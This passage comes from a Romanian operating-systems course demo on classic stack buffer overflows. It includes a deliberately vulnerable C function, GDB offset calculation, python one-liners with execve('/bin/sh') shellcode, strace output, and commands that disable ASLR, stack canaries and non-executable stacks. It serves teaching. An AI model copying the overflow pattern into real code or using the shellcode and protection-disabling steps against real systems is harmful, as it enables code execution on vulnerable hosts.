<pre class="code c"><span class="kw4">static</span> <span class="kw4">size_t</span> read_data<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
<span class="br0">&#123;</span>
	<span class="kw4">char</span> buffer<span class="br0">&#91;</span><span class="nu0">32</span><span class="br0">&#93;</span><span class="sy0">;</span>
&nbsp;
	<a href="http://www.opengroup.org/onlinepubs/009695399/functions/memset.html"><span class="kw3">memset</span></a><span class="br0">&#40;</span>buffer<span class="sy0">,</span> <span class="st0">'A'</span><span class="sy0">,</span> <span class="nu0">32</span><span class="br0">&#41;</span><span class="sy0">;</span>
	<a href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span class="kw3">printf</span></a><span class="br0">&#40;</span><span class="st0">&quot;Insert message (less than 32 bytes): &quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
	<a href="http://www.opengroup.org/onlinepubs/009695399/functions/fgets.html"><span class="kw3">fgets</span></a><span class="br0">&#40;</span>buffer<span class="sy0">,</span> <span class="nu0">64</span><span class="sy0">,</span> stdin<span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp;
	<span class="kw1">return</span> <a href="http://www.opengroup.org/onlinepubs/009695399/functions/strlen.html"><span class="kw3">strlen</span></a><span class="br0">&#40;</span>buffer<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre>

<p>
Compilăm noul program folosind <code>make</code>.
</p>

<p>
Pentru a afla diferența între buffer și valorea de retur, folosim GDB:
</p>
<pre class="code bash">$ <span class="kw2">gdb</span> <span class="re5">-q</span> .<span class="sy0">/</span>run-shellcode
Reading symbols from <span class="sy0">/</span>home<span class="sy0">/</span>razvan<span class="sy0">/</span>school<span class="sy0">/</span><span class="nu0">2011</span>-<span class="nu0">2012</span><span class="sy0">/</span>so<span class="sy0">/</span>git-repos<span class="sy0">/</span>cursuri.git<span class="sy0">/</span>curs-07-demo<span class="sy0">/</span>shellcode<span class="sy0">/</span>run-shellcode...done.
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> b main
Breakpoint <span class="nu0">1</span> at 0x8048550: <span class="kw2">file</span> run-shellcode.c, line <span class="nu0">33</span>.
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> run
Starting program: <span class="sy0">/</span>home<span class="sy0">/</span>razvan<span class="sy0">/</span>school<span class="sy0">/</span><span class="nu0">2011</span>-<span class="nu0">2012</span><span class="sy0">/</span>so<span class="sy0">/</span>git-repos<span class="sy0">/</span>cursuri.git<span class="sy0">/</span>curs-07-demo<span class="sy0">/</span>shellcode<span class="sy0">/</span>.<span class="sy0">/</span>run-shellcode 
warning: Could not load shared library symbols <span class="kw1">for</span> linux-gate.so.1.
Do you need <span class="st0">&quot;set solib-search-path&quot;</span> or <span class="st0">&quot;set sysroot&quot;</span>?
&nbsp;
Breakpoint <span class="nu0">1</span>, main <span class="br0">&#40;</span><span class="br0">&#41;</span> at run-shellcode.c:<span class="nu0">33</span>
<span class="nu0">33</span>		len = read_data<span class="br0">&#40;</span><span class="br0">&#41;</span>;
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> si
read_data <span class="br0">&#40;</span><span class="br0">&#41;</span> at run-shellcode.c:<span class="nu0">19</span>
<span class="nu0">19</span>	<span class="br0">&#123;</span>
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> x<span class="sy0">/</span>2wx <span class="re1">$esp</span>
0xffffd27c:	0x08048555	0x00000001
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> p <span class="sy0">&amp;</span>buffer
<span class="re4">$1</span> = <span class="br0">&#40;</span>char <span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="nu0">32</span><span class="br0">&#93;</span><span class="br0">&#41;</span> 0xffffd250</pre>

<p>
Mai sus, am realizat următorii pași:
</p>
<ol>
<li class="level1"><div class="li"> Am pornit GDB pe executabilul <code>run-shellcode</code>.</div>
</li>
<li class="level1"><div class="li"> Am pus breakpoint pe main și am rulat programul.</div>
</li>
<li class="level1"><div class="li"> Am avansat o instrucțiune (folosind <code>si</code> – <em>step instruction</em>) pentru a apela funcția <code>read_data</code>.</div>
</li>
<li class="level1"><div class="li"> Am afișat conținutul vârfului stivei pentru a afla adresa valorii de retur.</div>
<ul>
<li class="level2"><div class="li"> Adresa este <code>0xffffd27c</code> iar valoarea de retur este <code>0x08048555</code>.</div>
</li>
</ul>
</li>
<li class="level1"><div class="li"> Am aflat adresa buffer-ului: <code>0xffffd250</code>.</div>
</li>
</ol>

<p>
Diferența dintre adresa buffer-ul și adresa unde este stocată adresa de retur este <code>0xffffd27c - 0xffffd250 = 2c</code>, adică 44 de octeți.
</p>

<p>
Pentru a suprascrie, așadar, adresa de retur vom scrie în buffer, de la intrarea standard, prin intermediul funcției <code>fgets</code>, 44 de caractere <code>A</code> (până la adresa de retur) urmată de octeții corespunzători adresei unde vrem să facem saltul. Adică octeții corespunzători shellcode-ului, adică <code>0x10</code>, <code>0x86</code>, <code>0x04</code>, <code>0x08</code>. Acești octeți, reprezentând adresa shellcode-ului vor suprascrie adresa de retur corespunzătoare funcției <code>read_data</code>. Consecința va fi că încheierea funcției <code>read_data</code>, în locul revenirii în funcția <code>main</code> (funcția apelantă), se va face salt în shellcode și se va crea un shell prin intermediul apelului <code>execve</code> codificat în shellcode.
</p>

<p>
Pentru a executa operațiile de mai sus, folosim <code>python</code> la fel ca mai devreme. Scriem <code>44</code> de caractere <code>A</code> urmate de octeții corespunzători shellcode-ului:
</p>
<pre class="code bash"><span class="co4">$ </span>python <span class="re5">-c</span> <span class="st_h">'print &quot;A&quot;*44 + &quot;\x10\x86\x04\x08&quot;'</span> <span class="sy0">|</span> .<span class="sy0">/</span>run-shellcode</pre>

<p>
Programul pare să meargă dar nu obținem un shell. Acest lucru se întâmplă întrucât se închide, din pipe, intrarea standard și se închide și shell-ul însuși. Există metode de a face bypass la acest lucru, dar nu fac subiectul acestui demo. Pentru a confirma că se execută un shell, folosim strace:
</p>
<pre class="code bash">$ python <span class="re5">-c</span> <span class="st_h">'print &quot;A&quot;*44 + &quot;\x10\x86\x04\x08&quot;'</span> <span class="sy0">|</span> <span class="kw2">strace</span> <span class="re5">-e</span> execve .<span class="sy0">/</span>run-shellcode 
execve<span class="br0">&#40;</span><span class="st0">&quot;./run-shellcode&quot;</span>, <span class="br0">&#91;</span><span class="st0">&quot;./run-shellcode&quot;</span><span class="br0">&#93;</span>, <span class="br0">&#91;</span><span class="sy0">/*</span> <span class="nu0">41</span> vars <span class="sy0">*/</span><span class="br0">&#93;</span><span class="br0">&#41;</span> = <span class="nu0">0</span>
<span class="br0">&#91;</span> Process <span class="re2">PID</span>=<span class="nu0">20114</span> runs <span class="kw1">in</span> <span class="nu0">32</span> bit mode. <span class="br0">&#93;</span>
execve<span class="br0">&#40;</span><span class="st0">&quot;/bin//sh&quot;</span>, <span class="br0">&#91;</span><span class="st0">&quot;/bin//sh&quot;</span><span class="br0">&#93;</span>, <span class="br0">&#91;</span><span class="sy0">/*</span> <span class="nu0">0</span> vars <span class="sy0">*/</span><span class="br0">&#93;</span><span class="br0">&#41;</span> = <span class="nu0">0</span>
<span class="br0">&#91;</span> Process <span class="re2">PID</span>=<span class="nu0">20114</span> runs <span class="kw1">in</span> <span class="nu0">64</span> bit mode. <span class="br0">&#93;</span></pre>

<p>
Observăm de mai sus că am obținut într-adevăr execuția shellcode-ului, prin suprascrierea adresei de retur a funcției <code>read_data</code>. În final shellcode-ul a apelat un echivalent al <code>execve(&quot;/bin/sh&quot;)</code> care generează un shell.
</p>

</div>
<!-- EDIT10 SECTION "Stack buffer overflow cu shellcode" [29216-33375] -->
<h3 class="sectionedit11" id="stack_buffer_overflow_cu_shellcode_pe_stiva">Stack buffer overflow cu shellcode pe stivă</h3>
<div class="level3">

<p>
În mod evident, nu ne putem aștepta ca un shellcode să se găsească în codul sursă al programului. Shellcode-ul trebuie injectat într-o zonă în care putem scrie; cel mai simplu este chiar pe stivă, adică exact în cadrul bufferului. Apoi vom suprascrie adresa de retur a funcției <code>read_data</code> cu adresa de start a buffer-ului unde am scris shellcode-ul.
</p>

<p>
Pentru ca aceasta să funcționeze, trebuie să știm adresa buffer-ului. Din păcate (pentru atacator) avem în general activat ASLR (<em>Address Space Layout Randomization</em>). Prin urmare la diverse rulări buffer-ul nu va avea aceeași adresă (nu apare la GDB). Pentru a verifica asta, la programul anterior adăugăm, în funcția <code>read_data</code> apelul
</p>
<pre class="code c">	<a href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span class="kw3">printf</span></a><span class="br0">&#40;</span><span class="st0">&quot;buffer address: %p<span class="es1">\n</span>&quot;</span><span class="sy0">,</span> buffer<span class="br0">&#41;</span><span class="sy0">;</span></pre>

<p>
Compilăm și rulăm de mai multe ori:
</p>
<pre class="code bash"><span class="co4">user@host:~$ </span><span class="kw2">make</span>
<span class="kw2">gcc</span> <span class="re5">-Wall</span> <span class="re5">-Wextra</span> <span class="re5">-g</span> <span class="re5">-m32</span> <span class="re5">-fno-stack-protector</span> -I..<span class="sy0">/</span>utils  <span class="re5">-c</span> <span class="re5">-o</span> run-shellcode.o run-shellcode.c
<span class="kw2">gcc</span> <span class="re5">-m32</span> <span class="re5">-z</span> execstack  run-shellcode.o   <span class="re5">-o</span> run-shellcode
&nbsp;
<span class="co4">user@host:~$ </span>.<span class="sy0">/</span>run-shellcode 
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">32</span> bytes<span class="br0">&#41;</span>: aaa
buffer address: 0xff8db4d0
&nbsp;
Read <span class="nu0">4</span> bytes from standard input.
<span class="co4">user@host:~$ </span>.<span class="sy0">/</span>run-shellcode 
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">32</span> bytes<span class="br0">&#41;</span>: aaa
buffer address: 0xffdf0270
&nbsp;
Read <span class="nu0">4</span> bytes from standard input.
&nbsp;
<span class="co4">user@host:~$ </span>.<span class="sy0">/</span>run-shellcode aaa
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">32</span> bytes<span class="br0">&#41;</span>: aaa
buffer address: 0xffef6ad0
&nbsp;
Read <span class="nu0">4</span> bytes from standard input.</pre>

<p>
Observăm că bufferul are la fiecare rulare altă adresă. Putem folosi brute forcing, dar durează.
</p>

<p>
Pentru scopuri didactice vom dezactiva suportul de ASLR folosind comanda
</p>
<pre class="code bash"><span class="kw3">echo</span> <span class="nu0">0</span> <span class="sy0">|</span> <span class="kw2">sudo</span> <span class="kw2">tee</span> <span class="sy0">/</span>proc<span class="sy0">/</span>sys<span class="sy0">/</span>kernel<span class="sy0">/</span>randomize_va_space</pre>

<p>
Acum vom avea aceeași adresă a buffer-ului la multiple rulări ale executabilului <code>run-shellcode</code>:
</p>
<pre class="code bash"><span class="co4">user@host:~$ </span>.<span class="sy0">/</span>run-shellcode 
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">32</span> bytes<span class="br0">&#41;</span>: aaa
buffer address: 0xffffd2b0
&nbsp;
Read <span class="nu0">4</span> bytes from standard input.
&nbsp;
<span class="co4">user@host:~$ </span>.<span class="sy0">/</span>run-shellcode 
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">32</span> bytes<span class="br0">&#41;</span>: aaa
buffer address: 0xffffd2b0
&nbsp;
Read <span class="nu0">4</span> bytes from standard input.</pre>

<p>
Adresa buffer-ului va fi adresa shellcode-ului pentru că vom scrie shellcode-ul chiar în buffer. Ceea ce înseamnă că vom suprascrie adresa de retur a funcției <code>read_data</code> cu adresa buffer-ului adică cu octeții <code>\xb0</code>, <code>\xd2</code>, <code>\xff</code>, <code>\xff</code>.
</p>

<p>
Ținem cont că trebuie să scriem 44 de caractere de orice fel și apoi să scriem acei octeți. Din acele 44 de caractere de orice fel primele trebuie să fie chiar shellcode-ul, adică șirul <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80</code>. Shellcode-ul are 25 de octeți. Vom scrie așadar în buffer:
</p>
<ol>
<li class="level1"><div class="li"> shellcode-ul: 25 de octeți</div>
</li>
<li class="level1"><div class="li"> payload (adică 44-25=19 caractere, vom folosi caracterul <code>A</code>)</div>
</li>
<li class="level1"><div class="li"> octeții <code>\xb0</code>, <code>\xd2</code>, <code>\xff</code>, <code>\xff</code> reprezentând adresa de start a bufferului, adică începutul shellcode-ului</div>
</li>
</ol>

<p>
Vom folosi, ca și mai devreme, python pentru a scrie informațiile de mai sus în buffer:
</p>
<pre class="code bash"><span class="co4">user@host:~$ </span>python <span class="re5">-c</span> <span class="st_h">'print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot; + 19*&quot;A&quot; + &quot;\xb0\xd2\xff\xff&quot;'</span> <span class="sy0">|</span> .<span class="sy0">/</span>run-shellcode 
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">32</span> bytes<span class="br0">&#41;</span>: buffer address: 0xffffd2b0</pre>

<p>
La fel ca mai sus nu se generează un prompt de shell pentru că se închide intrarea standard. Dar putem folosi <code>strace</code> ca să vedem că se apelează <code>execve</code> și se creează un proces shell:
</p>
<pre class="code bash"><span class="co4">user@host:~$ </span>python <span class="re5">-c</span> <span class="st_h">'print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot; + 19*&quot;A&quot; + &quot;\xb0\xd2\xff\xff&quot;'</span> <span class="sy0">|</span> <span class="kw2">strace</span> <span class="re5">-e</span> execve .<span class="sy0">/</span>run-shellcode 
execve<span class="br0">&#40;</span><span class="st0">&quot;./run-shellcode&quot;</span>, <span class="br0">&#91;</span><span class="st0">&quot;./run-shellcode&quot;</span><span class="br0">&#93;</span>, <span class="br0">&#91;</span><span class="sy0">/*</span> <span class="nu0">41</span> vars <span class="sy0">*/</span><span class="br0">&#93;</span><span class="br0">&#41;</span> = <span class="nu0">0</span>
<span class="br0">&#91;</span> Process <span class="re2">PID</span>=<span class="nu0">24236</span> runs <span class="kw1">in</span> <span class="nu0">32</span> bit mode. <span class="br0">&#93;</span>
Insert message <span class="br0">&#40;</span><span class="kw2">less</span> than <span class="nu0">32</span> bytes<span class="br0">&#41;</span>: buffer address: 0xffffd2b0
execve<span class="br0">&#40;</span><span class="st0">&quot;/bin//sh&quot;</span>, <span class="br0">&#91;</span><span class="st0">&quot;/bin//sh&quot;</span><span class="br0">&#93;</span>, <span class="br0">&#91;</span><span class="sy0">/*</span> <span class="nu0">0</span> vars <span class="sy0">*/</span><span class="br0">&#93;</span><span class="br0">&#41;</span> = <span class="nu0">0</span>
<span class="br0">&#91;</span> Process <span class="re2">PID</span>=<span class="nu0">24236</span> runs <span class="kw1">in</span> <span class="nu0">64</span> bit mode. <span class="br0">&#93;</span></pre>

<p>
În acest fel am executat o formă clasică de stack buffer overflow cu injectare de cod (shellcode) pe stivă. Shellcode-ul a fost scris pe stivă și apoi am suprascris adresa de retur a funcției cu adresa de început a shellcode-ului, adică adresa buffer-ului. Rezultatul a fost crearea unui proces shell prin invocarea apelului de sistem <code>execve</code> codificat în shellcode.
</p>

<p>
Pentru a realiza acest lucru am dezactivat mecanismele de protecție din Linux:
</p>
<ul>
<li class="level1"><div class="li"> Am dezactivat stack protector/canary value prin opțiunea <code>-fno-stack-protector</code> la compilare.</div>
</li>
<li class="level1"><div class="li"> Am permis ca stiva să fie executabilă prin opțiunea <code>-z execstack</code> la link-editare.</div>
</li>
<li class="level1"><div class="li"> Am dezactivat suportul de ASLR prin scrierea în fișierul <code>/proc/sys/kernel/randomize_va_space</code>.</div>
</li>
</ul>

<p>
Atacurile reale trebuie să țină cont de aceste mecanisme de protecție care sunt comune pe sistemele de operare moderne. Din acest motiv atacurile sunt dificil de realizat (dar nu imposibil), lucru care face selectă populația celor care sunt capabili să genereze atacuri de exploatare a vulnerabilităților memoriei.
</p>

</div>
<!-- EDIT11 SECTION "Stack buffer overflow cu shellcode pe stivă" [33376-] --></div>
</body>
</html>
